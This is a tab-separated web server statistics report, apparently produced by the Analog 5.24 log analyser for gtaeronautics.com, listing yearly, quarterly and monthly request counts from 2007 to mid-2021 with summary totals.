x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2021	07	04	06	08
x	FR	2007	12	18	17	05
x	LR	2021	07	02	23	57
x	E7	2021	07	04	06	08
x	SR	963440
x	S7	2390
x	NC	385209
x	C7	0
x	FL	401322
x	F7	399
x	RR	180
x	R7	0
x	NH	85211
x	H7	361
x	BT	35896928582
x	B7	107918443
1	Rr	51693	5.365	2021
1	Rr	89380	9.277	2020
1	Rr	80088	8.313	2019
1	Rr	68927	7.154	2018
1	Rr	60168	6.245	2017
1	Rr	73316	7.610	2016
1	Rr	80796	8.386	2015
1	Rr	110773	11.498	2014
1	Rr	65173	6.765	2013
1	Rr	60742	6.305	2012
1	Rr	57015	5.918	2011
1	Rr	22139	2.298	2010
1	Rr	69710	7.236	2009
1	Rr	71820	7.455	2008
1	Rr	1700	0.176	2007
1	*BT	R	110773	2014
Q	Rr	756	0.078	2021	3
Q	Rr	30675	3.184	2021	2
Q	Rr	20262	2.103	2021	1
Q	Rr	22199	2.304	2020	4
Q	Rr	23882	2.479	2020	3
Q	Rr	21656	2.248	2020	2
Q	Rr	21643	2.246	2020	1
Q	Rr	19098	1.982	2019	4
Q	Rr	19668	2.041	2019	3
Q	Rr	19827	2.058	2019	2
Q	Rr	21495	2.231	2019	1
Q	Rr	18129	1.882	2018	4
Q	Rr	17138	1.779	2018	3
Q	Rr	16928	1.757	2018	2
Q	Rr	16732	1.737	2018	1
Q	Rr	15937	1.654	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.747	2017	2
Q	Rr	27400	2.844	2017	1
Q	Rr	22114	2.295	2016	4
Q	Rr	17621	1.829	2016	3
Q	Rr	15878	1.648	2016	2
Q	Rr	17703	1.837	2016	1
Q	Rr	16575	1.720	2015	4
Q	Rr	22104	2.294	2015	3
Q	Rr	22485	2.334	2015	2
Q	Rr	19632	2.038	2015	1
Q	Rr	21142	2.194	2014	4
Q	Rr	22272	2.312	2014	3
Q	Rr	31453	3.265	2014	2
Q	Rr	35906	3.727	2014	1
Q	Rr	16436	1.706	2013	4
Q	Rr	15216	1.579	2013	3
Q	Rr	16545	1.717	2013	2
Q	Rr	16976	1.762	2013	1
Q	Rr	16578	1.721	2012	4
Q	Rr	12511	1.299	2012	3
Q	Rr	15816	1.642	2012	2
Q	Rr	15837	1.644	2012	1
Q	Rr	15444	1.603	2011	4
Q	Rr	17386	1.805	2011	3
Q	Rr	9395	0.975	2011	2
Q	Rr	14790	1.535	2011	1
Q	Rr	1603	0.166	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.458	2010	2
Q	Rr	6489	0.674	2010	1
Q	Rr	16350	1.697	2009	4
Q	Rr	18220	1.891	2009	3
Q	Rr	17115	1.776	2009	2
Q	Rr	18025	1.871	2009	1
Q	Rr	15905	1.651	2008	4
Q	Rr	15660	1.625	2008	3
Q	Rr	22448	2.330	2008	2
Q	Rr	17807	1.848	2008	1
Q	Rr	1700	0.176	2007	4
Q	*BT	R	35906	2014	1
m	Rr	756	0.078	2021	07
m	Rr	10152	1.054	2021	06
m	Rr	10231	1.062	2021	05
m	Rr	10292	1.068	2021	04
m	Rr	7948	0.825	2021	03
m	Rr	5800	0.602	2021	02
m	Rr	6514	0.676	2021	01
m	Rr	8069	0.838	2020	12
m	Rr	6579	0.683	2020	11
m	Rr	7551	0.784	2020	10
m	Rr	8028	0.833	2020	09
m	Rr	7741	0.803	2020	08
m	Rr	8113	0.842	2020	07
m	Rr	7317	0.759	2020	06
m	Rr	6898	0.716	2020	05
m	Rr	7441	0.772	2020	04
m	Rr	7524	0.781	2020	03
m	Rr	7322	0.760	2020	02
m	Rr	6797	0.705	2020	01
m	Rr	6573	0.682	2019	12
m	Rr	5917	0.614	2019	11
m	Rr	6608	0.686	2019	10
m	Rr	6791	0.705	2019	09
m	Rr	6597	0.685	2019	08
m	Rr	6280	0.652	2019	07
m	Rr	6317	0.656	2019	06
m	Rr	6847	0.711	2019	05
m	Rr	6663	0.692	2019	04
m	Rr	7059	0.733	2019	03
m	Rr	6374	0.662	2019	02
m	Rr	8062	0.837	2019	01
m	Rr	6957	0.722	2018	12
m	Rr	5422	0.563	2018	11
m	Rr	5750	0.597	2018	10
m	Rr	5458	0.567	2018	09
m	Rr	5735	0.595	2018	08
m	Rr	5945	0.617	2018	07
m	Rr	7110	0.738	2018	06
m	Rr	6440	0.668	2018	05
m	Rr	3378	0.351	2018	04
m	Rr	5789	0.601	2018	03
m	Rr	5369	0.557	2018	02
m	Rr	5574	0.579	2018	01
m	Rr	3906	0.405	2017	12
m	Rr	6533	0.678	2017	11
m	Rr	5498	0.571	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.709	2017	05
m	Rr	9999	1.038	2017	04
m	Rr	11887	1.234	2017	03
m	Rr	7941	0.824	2017	02
m	Rr	7572	0.786	2017	01
m	Rr	9483	0.984	2016	12
m	Rr	7121	0.739	2016	11
m	Rr	5510	0.572	2016	10
m	Rr	6288	0.653	2016	09
m	Rr	5888	0.611	2016	08
m	Rr	5445	0.565	2016	07
m	Rr	5042	0.523	2016	06
m	Rr	5495	0.570	2016	05
m	Rr	5341	0.554	2016	04
m	Rr	5558	0.577	2016	03
m	Rr	5548	0.576	2016	02
m	Rr	6597	0.685	2016	01
m	Rr	5574	0.579	2015	12
m	Rr	5330	0.553	2015	11
m	Rr	5671	0.589	2015	10
m	Rr	6196	0.643	2015	09
m	Rr	6788	0.705	2015	08
m	Rr	9120	0.947	2015	07
m	Rr	7156	0.743	2015	06
m	Rr	5694	0.591	2015	05
m	Rr	9635	1.000	2015	04
m	Rr	6215	0.645	2015	03
m	Rr	6084	0.631	2015	02
m	Rr	7333	0.761	2015	01
m	Rr	6608	0.686	2014	12
m	Rr	6997	0.726	2014	11
m	Rr	7537	0.782	2014	10
m	Rr	7043	0.731	2014	09
m	Rr	7324	0.760	2014	08
m	Rr	7905	0.820	2014	07
m	Rr	11654	1.210	2014	06
m	Rr	9211	0.956	2014	05
m	Rr	10588	1.099	2014	04
m	Rr	7817	0.811	2014	03
m	Rr	15229	1.581	2014	02
m	Rr	12860	1.335	2014	01
m	Rr	5325	0.553	2013	12
m	Rr	5513	0.572	2013	11
m	Rr	5598	0.581	2013	10
m	Rr	4655	0.483	2013	09
m	Rr	4938	0.513	2013	08
m	Rr	5623	0.584	2013	07
m	Rr	5492	0.570	2013	06
m	Rr	5211	0.541	2013	05
m	Rr	5842	0.606	2013	04
m	Rr	6068	0.630	2013	03
m	Rr	5055	0.525	2013	02
m	Rr	5853	0.608	2013	01
m	Rr	5688	0.590	2012	12
m	Rr	5477	0.568	2012	11
m	Rr	5413	0.562	2012	10
m	Rr	4331	0.450	2012	09
m	Rr	3866	0.401	2012	08
m	Rr	4314	0.448	2012	07
m	Rr	4655	0.483	2012	06
m	Rr	6047	0.628	2012	05
m	Rr	5114	0.531	2012	04
m	Rr	6128	0.636	2012	03
m	Rr	5430	0.564	2012	02
m	Rr	4279	0.444	2012	01
m	Rr	5548	0.576	2011	12
m	Rr	4779	0.496	2011	11
m	Rr	5117	0.531	2011	10
m	Rr	5431	0.564	2011	09
m	Rr	6256	0.649	2011	08
